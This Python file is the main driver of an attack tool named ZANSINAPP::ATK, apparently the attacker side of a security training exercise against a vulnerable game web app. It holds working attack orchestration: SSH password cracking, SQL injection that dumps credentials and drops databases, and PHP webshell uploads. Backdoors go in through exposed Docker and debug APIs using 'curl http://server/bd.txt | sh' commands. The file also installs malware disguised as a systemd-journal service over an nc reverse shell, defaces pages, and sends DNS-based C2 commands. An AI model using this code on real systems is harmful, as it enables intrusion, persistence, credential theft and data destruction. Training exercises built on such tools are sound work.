#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# cmd
# python3 -m venv venv
# .\venv\Scripts\activate.bat
#  or
# source ./venv/bin/activate
# pip3 install -r requirements.txt
# for vscode: View->Command Palette->set `Python: Select Interpreter`
# python main.py 192.168.159.131 192.168.10.222 42375
# Logo: ANSI Shadow at https://manytools.org/hacker-tools/ascii-banner/
import os
import sys
import time
import base64
import ipaddress
import threading
import subprocess
from .util import Utility
from .poc.zansinapp_atk_upload_php import AtkUploadPHP
from .poc.zansinapp_atk_docker_api import AtkDockerApi
from .poc.zansinapp_atk_debug_api import AtkDebugApi
from .poc.zansinapp_atk_gamecheat_sqli import AtkGameCheatSQLi
from .poc.zansinapp_atk_gamecheat_battle_leveling import AtkGameCheatBattleLeveling
from .poc.zansinapp_atk_gamecheat_dump_credentials import AtkGameCheatDumpCredentials
from .poc.zansinapp_atk_gamecheat_userlist_ban import AtkGameCheatUserListBan
from .poc.zansinapp_atk_backdoor_create_cheatuser import AtkBackdoorCreateCheatUser
from .poc.zansinapp_atk_drop_db_sqli import AtkDropDBSQLi
#from poc.zansinapp_atk_backdoor_webshell_send_cmd import AtkBackdoorWebshellSendCmd
from .poc.zansinapp_atk_gamecheat_zerocost_gacha import AtkGameCheatZeroCostGacha
from .poc.zansinapp_atk_ssh import AtkSSH
from .poc.zansinapp_atk_passcrack_ssh import AtkPassCrackSSH
from .poc.zansinapp_atk_nmap import AtkNmap
from .poc.zansinapp_atk_nikto import AtkNikto
from .poc.zansinapp_atk_rshell import AtkReverseShell
from .poc.zansinapp_atk_web import AtkWebServer
from .poc.zansinapp_atk_dns import AtkDnsServer
from .poc.zansinapp_atk_stopprocess import AtkStopProcess

OK = 'ok'         # [*]
NOTE = 'note'     # [+]
FAIL = 'fail'     # [-]
WARNING = 'warn'  # [!]
NONE = 'none'     # No label.

OK_BLUE = '\033[94m'      # [*]
NOTE_GREEN = '\033[92m'   # [+]
FAIL_RED = '\033[91m'     # [-]
WARN_YELLOW = '\033[93m'  # [!]
ENDC = '\033[0m'

flags = {
    "upload_webshell"  : False,
    "upload_cheatfile" : False,
    "install_backdoor" : False,
    #"install_malware"  : False,
    "index_tamparing"  : False,
    #"drop_db"          : False,
}


def show_banner(utility):
    banner = """
███████╗ █████╗ ███╗   ██╗███████╗██╗███╗   ██╗ █████╗ ██████╗ ██████╗        █████╗ ████████╗██╗  ██╗
╚══███╔╝██╔══██╗████╗  ██║██╔════╝██║████╗  ██║██╔══██╗██╔══██╗██╔══██╗██╗██╗██╔══██╗╚══██╔══╝██║ ██╔╝
  ███╔╝ ███████║██╔██╗ ██║███████╗██║██╔██╗ ██║███████║██████╔╝██████╔╝╚═╝╚═╝███████║   ██║   █████╔╝ 
 ███╔╝  ██╔══██║██║╚██╗██║╚════██║██║██║╚██╗██║██╔══██║██╔═══╝ ██╔═══╝ ██╗██╗██╔══██║   ██║   ██╔═██╗ 
███████╗██║  ██║██║ ╚████║███████║██║██║ ╚████║██║  ██║██║     ██║     ╚═╝╚═╝██║  ██║   ██║   ██║  ██╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝           ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    
""" + 'by ' + os.path.basename(__file__)
    #print(banner)
    utility.print_message(NONE, banner)
    show_credit(utility)
    time.sleep(utility.banner_delay)


# Show credit.
def show_credit(utility):
    credit = u"""
       =[ Version : ZANSINAPP::ATK v0.0.2                  ]=
    """
    utility.print_message(NONE, credit)


def wrap_text(type, text):
    if type == OK:
        return OK_BLUE + text + ENDC
    elif type == NOTE:
        return NOTE_GREEN + text + ENDC
    elif type == FAIL:
        return FAIL_RED + text + ENDC
    elif type == WARNING:
        return WARN_YELLOW + text + ENDC
    else:
        return text


def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_num, user_agent):
    debug = False
    target = "127.0.0.1"
    server = "127.0.0.1"
    serverport = "12345"
    ua = "atk"
    ratio = 1

    try:
        target = str(ipaddress.ip_address(target_host_ip))
        server = str(ipaddress.ip_address(self_host_ip))
        serverport = self_host_port
        if not 1 <= int(serverport) <= 65535:
            raise ValueError("Invalid port number")
        ua = user_agent.replace("\n", "")
    except Exception as e:
        print("Error: %s" % e)
        sys.exit(1)

    utility = Utility(target, ua, attack_scenario_num)
    if not attack_scenario_num == 0:
        ratio = 60
        
    show_banner(utility)

    def nmap(wait):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Nmap Scan" % (utility.get_current_date())))
        atk = AtkNmap(utility, target, debug)
        open_ports = atk.sendattack()
        utility.print_message(OK, wrap_text(OK, "open_ports: {}".format(open_ports)))
        return True

    def nikto(wait):
        time.sleep(wait * ratio)
        # this scan is working in background because the script uses too much time. 
        utility.print_message(OK, wrap_text(OK, "%s:Nikto Scan" % (utility.get_current_date())))
        atk = AtkNikto(utility, target, "nikto", debug)
        atk.sendattack()
        return True

    def upload_webshell(wait):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Upload PHP: WebShell" % (utility.get_current_date())))
        atk = AtkUploadPHP(utility, target, "80", debug)
        flags["upload_webshell"] = atk.sendattack("./attack/public/login.php")
        return True

    def upload_cheatfile(wait):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Upload PHP: Cheat User Page" % (utility.get_current_date())))
        atk = AtkUploadPHP(utility, target, "80", debug)
        flags["upload_cheatfile"] = atk.sendattack("./attack/public/new_user.php")
        return True

    def backdoor_ssh(wait):
        time.sleep(wait * ratio)
        if flags["install_backdoor"] == False:
            utility.print_message(OK, wrap_text(OK, "%s:SSH Exploit: set backdoor" % (utility.get_current_date())))
            atk = AtkSSH(utility, target, 22, debug)
            users = ("mario","vendor")
            for user in users:
                cmd = 'curl -s http://%s:%s/bd.txt | sudo /bin/sh' % (server, serverport)
                b64cmd = base64.b64encode(cmd.encode()).decode()
                stdout = atk.sendattack(b64cmd, user, "Passw0rd!23") # b64command, user, password
                if stdout != None:
                    utility.print_message(OK, wrap_text(OK, "stdout: {}".format(stdout)))
                    check_ssh()
                    break
        else:
            utility.print_message(OK, wrap_text(OK, "%s:[SKIP] The backdoor is already installed :SSH Exploit: set backdoor" % (utility.get_current_date())))
        return True

    def backdoor_docker(wait):
        time.sleep(wait * ratio)
        if flags["install_backdoor"] == False:
            utility.print_message(OK, wrap_text(OK, "%s:Docker API Exploit: set backdoor" % (utility.get_current_date())))
            atk = AtkDockerApi(utility, target, "2375", debug)
            cmd = 'curl -s http://%s:%s/bd.txt | /bin/sh' % (server, serverport)
            b64cmd = base64.b64encode(cmd.encode()).decode()
            atk.sendattack(b64cmd)
            check_ssh()
        else:
            utility.print_message(OK, wrap_text(OK, "%s:[SKIP] The backdoor is already installed :Docker API Exploit: set backdoor" % (utility.get_current_date())))
        return True

    def backdoor_debug(wait):
        time.sleep(wait * ratio)
        if flags["install_backdoor"] == False:
            utility.print_message(OK, wrap_text(OK, "%s:Debug API Exploit: set backdoor" % (utility.get_current_date())))
            atk = AtkDebugApi(utility, target, "80", debug)
            cmd = 'umount /mnt; if [ -e /dev/dm-0 ]; then if [ ! -e /dev/mapper/ubuntu--vg-ubuntu--lv ]; then ln -s /dev/dm-0 /dev/mapper/ubuntu--vg-ubuntu--lv; fi; mount -t ext4 /dev/dm-0 /mnt; else mount -t ext4 /dev/sda2 /mnt; fi; chroot /mnt /bin/bash -c "curl -s http://%s:%s/bd.txt | /bin/sh"' % (server, serverport)
            b64cmd = base64.b64encode(cmd.encode()).decode()
            atk.sendattack("/debug/login", b64cmd)
            check_ssh()
        else:
            utility.print_message(OK, wrap_text(OK, "%s:[SKIP] The backdoor is already installed :Debug API Exploit: set backdoor" % (utility.get_current_date())))
        return True

    def install_malware_rsh(wait):
        time.sleep(wait * ratio)
        if flags["install_backdoor"] == True:
            # this scan is working in background because the script uses too much time.
            utility.print_message(OK, wrap_text(OK, "%s:Reverse Shell Exploit: Install Malware" % (utility.get_current_date())))
            serverhost = server + ":" + serverport
            tmpcmd = 'curl -s http://%s/_.systemd-journal.bin -o /var/tmp/systemd-private-journal && chmod 755 /var/tmp/systemd-private-journal && curl -s http://%s/_.syspoll-b64 -o /var/tmp/systemd-private-journal-zWuKif && curl -s http://%s/systemd-journal.service -o /etc/systemd/system/systemd-journal.service ; systemctl daemon-reload ; systemctl start systemd-journal.service ; systemctl enable systemd-journal.service ; exit' % (serverhost, serverhost, serverhost)
            cmd = "echo \"%s\" | nc -lvp %s" % (tmpcmd, str(utility.reverseshellport))
            atk = AtkReverseShell(utility, target, cmd, debug)
            atk.sendattack()
        else:
            utility.print_message(OK, wrap_text(OK, "%s:[SKIP] The backdoor is not installed :ReverseShell Exploit: set backdoor" % (utility.get_current_date())))
        return True

    def install_malware_ssh(wait):
        time.sleep(wait * ratio)
        success = False
        utility.print_message(OK, wrap_text(OK, "%s:SSH Exploit: install malware" % (utility.get_current_date())))
        atk = AtkSSH(utility, target, 22, debug)
        serverhost = server + ":" + serverport
        cmd = 'sudo curl -s http://%s/_.systemd-journal.bin -o /var/tmp/systemd-private-journal && sudo chmod 755 /var/tmp/systemd-private-journal && sudo curl -s http://%s/_.syspoll-b64 -o /var/tmp/systemd-private-journal-zWuKif && sudo curl -s http://%s/systemd-journal.service -o /etc/systemd/system/systemd-journal.service ; sudo systemctl daemon-reload ; sudo systemctl start systemd-journal.service ; sudo systemctl enable systemd-journal.service ;' % (serverhost, serverhost, serverhost)
        users = ("mario","vendor")
        b64cmd = base64.b64encode(cmd.encode()).decode()
        for user in users:
            stdout = atk.sendattack(b64cmd, user, "Passw0rd!23") # b64command, user, password
            if stdout != None:
                utility.print_message(OK, wrap_text(OK, "stdout: {}".format(stdout)))
                success = True
                break
        if flags["install_backdoor"] == True and success == False:
            users = ("wario", "nobody", "www-data", "root")
            for user in users:
                stdout = atk.sendattack(b64cmd, user, "", "./tmp.key") # b64command, user, password, key
                if stdout != None:
                    utility.print_message(OK, wrap_text(OK, "stdout: {}".format(stdout)))
                    break
        return True

    def cheat_user_sqli1(wait, option):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Login SQLi1" % (utility.get_current_date())))
        atk = AtkGameCheatSQLi(utility, target, "80", debug)
        atk.sendattack("/login", option)
        return True

    def cheat_user_sqli2(wait, option):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Create SQLi2" % (utility.get_current_date())))
        atk = AtkGameCheatSQLi(utility, target, "80", debug)
        atk.sendattack("/create", option)
        return True

    def cheat_user_php(wait, option):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Backdoor Create Cheat User" % (utility.get_current_date())))
        atk = AtkBackdoorCreateCheatUser(utility, target, "80", debug)
        atk.sendattack("/images/players/new_user.php", option) # backdoor path, num of create user(s)
        return True

    def cheat_battle(wait, option):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Battle Leveling" % (utility.get_current_date())))
        atk = AtkGameCheatBattleLeveling(utility, target, "80", debug)
        atk.sendattack(option, 4123) # num of create user(s), exp
        return True

    def exploit_userlist_ban(wait, option):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat UserList Ban" % (utility.get_current_date())))
        atk = AtkGameCheatUserListBan(utility, target, "80", debug)
        atk.sendattack(option, True) # num of delete user(s), reverse flag
        return True

    def passcrack_ssh(wait):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Password Cracking SSH" % (utility.get_current_date())))
        atk = AtkPassCrackSSH(utility, target, 22, debug)
        users = ("mario","vendor")
        for user in users:
            pwd = atk.sendattack(user) # user
            if pwd != None:
                utility.print_message(OK, wrap_text(OK, "password: {}".format(pwd)))
                break
        return True

    def cheat_dump_player(wait, option):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Dump Credentials" % (utility.get_current_date())))
        atk = AtkGameCheatDumpCredentials(utility, target, "80", debug)
        atk.sendattack(option, False, True) # num of delete user(s), delete flag, reverse flag
        return True

    def cheat_dump_player_delete(wait, option):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Dump Credentials and Delete" % (utility.get_current_date())))
        atk = AtkGameCheatDumpCredentials(utility, target, "80", debug)
        atk.sendattack(option, True, True) # num of delete user(s), delete flag, reverse flag
        return True

    def cheat_gacha(wait, option):
        time.sleep(wait * ratio)
        # this attack is working in background because the script uses too much time. 
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Zero-Cost Gacha" % (utility.get_current_date())))
        atk = AtkGameCheatZeroCostGacha(utility, target, debug)
        atk.sendattack(0.1, option) # interval, count
        return True

    def exploit_index_docker(wait):
        time.sleep(wait * ratio)
        if flags["index_tamparing"] == False:
            utility.print_message(OK, wrap_text(OK, "%s:Docker API Exploit: Web page tampering" % (utility.get_current_date())))
            atk = AtkDockerApi(utility, target, "2375", debug)
            cmd = 'if [ -f "/var/www/html/index.html.backup" ]; then echo "OK"; else cp -p /var/www/html/index.html /var/www/html/index.html.backup; rm -f /var/www/html/index.html; curl -s http://%s:%s/index.html -o /var/www/html/index.html; wget http://%s:%s/index.html -O /var/www/html/index.html; fi' % (server, serverport, server, serverport)
            b64cmd = base64.b64encode(cmd.encode()).decode()
            atk.sendattack(b64cmd)
        return True

    def exploit_index_debug(wait):
        time.sleep(wait * ratio)
        if flags["index_tamparing"] == False:
            utility.print_message(OK, wrap_text(OK, "%s:Debug API Exploit: Web page tampering" % (utility.get_current_date())))
            atk = AtkDebugApi(utility, target, "80", debug)
            cmd = 'umount /mnt; if [ -e /dev/dm-0 ]; then if [ ! -e /dev/mapper/ubuntu--vg-ubuntu--lv ]; then ln -s /dev/dm-0 /dev/mapper/ubuntu--vg-ubuntu--lv; fi; mount -t ext4 /dev/dm-0 /mnt; else mount -t ext4 /dev/sda2 /mnt; fi; chroot /mnt /bin/bash -c "if [ -f /var/www/html/index.html.backup ]; then echo OK; else cp -p /var/www/html/index.html /var/www/html/index.html.backup; rm -f /var/www/html/index.html; curl -s http://%s:%s/index.html -o /var/www/html/index.html; wget http://%s:%s/index.html -O /var/www/html/index.html; fi"' % (server, serverport, server, serverport)
            b64cmd = base64.b64encode(cmd.encode()).decode()
            atk.sendattack("/debug/login", b64cmd)
        return True

    def drop_db1(wait):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Drop Database SQLi Exploit: Login" % (utility.get_current_date())))
        atk = AtkDropDBSQLi(utility, target, "80", debug)
        atk.sendattack("/login")
        return True

    def drop_db2(wait):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:Drop Database SQLi Exploit: Create User" % (utility.get_current_date())))
        atk = AtkDropDBSQLi(utility, target, "80", debug)
        atk.sendattack("/create")
        return True

    def wall_c2(wait):
        time.sleep(wait * ratio)
        utility.print_message(OK, wrap_text(OK, "%s:C2 Command: wall" % (utility.get_current_date())))
        dnsserver = AtkDnsServer(utility, debug)
        dnsserver.startserver(server)
        utility.add_c2cmd(target, 'wall Hi,\ I\ am\ a\ malware.')
        return True

    def check_ssh():
        utility.print_message(OK, wrap_text(OK, "%s:SSH Check" % (utility.get_current_date())))
        atk = AtkSSH(utility, target, 22, debug)
        users = ("wario", "nobody", "www-data", "root")
        for user in users:
            cmd = 'whoami'
            b64cmd = base64.b64encode(cmd.encode()).decode()
            stdout = atk.sendattack(b64cmd, user, "", os.path.join(utility.full_path, "tmp.key")) # b64command, user, password, key
            if stdout != None:
                utility.print_message(OK, wrap_text(OK, "stdout: {}".format(stdout)))
                flags["install_backdoor"] = True
                break
        return True
    
    #===========================================================================
    # Generate files and start servers
    #===========================================================================
    utility.generage_public_files(target, server, utility.reverseshellport)
    atk_stop_process = AtkStopProcess(server, serverport, debug)
    webserver = AtkWebServer(server, serverport, debug)
    webserver.stopserver()
    webserver.startserver()
    #dnsserver = AtkDnsServer(debug)
    time.sleep(5)

    #===========================================================================
    # Executing Scenario
    #===========================================================================
    threads = []
    for s in utility.scenario_list:
        #print(s.scenario, s.waittime, s.option)
        th = None
        if s.scenario in locals():
            if s.option.isdigit() and s.option == "0":
                th = threading.Thread(target=locals()[s.scenario], args=(s.waittime,), daemon=True)
            elif s.option.isdigit():
                th = threading.Thread(target=locals()[s.scenario], args=(s.waittime, int(s.option), ), daemon=True)
            else:
                th = threading.Thread(target=locals()[s.scenario], args=(s.waittime,), daemon=True)
            threads.append(th)
            th.start()
    
    for th in threads:
        th.join()

    #===========================================================================
    # 99. Stop some processes
    #===========================================================================
    time.sleep(5)
    atk_stop_process.stop()

    utility.print_message(NOTE, "Finish!")

    sys.exit(0)
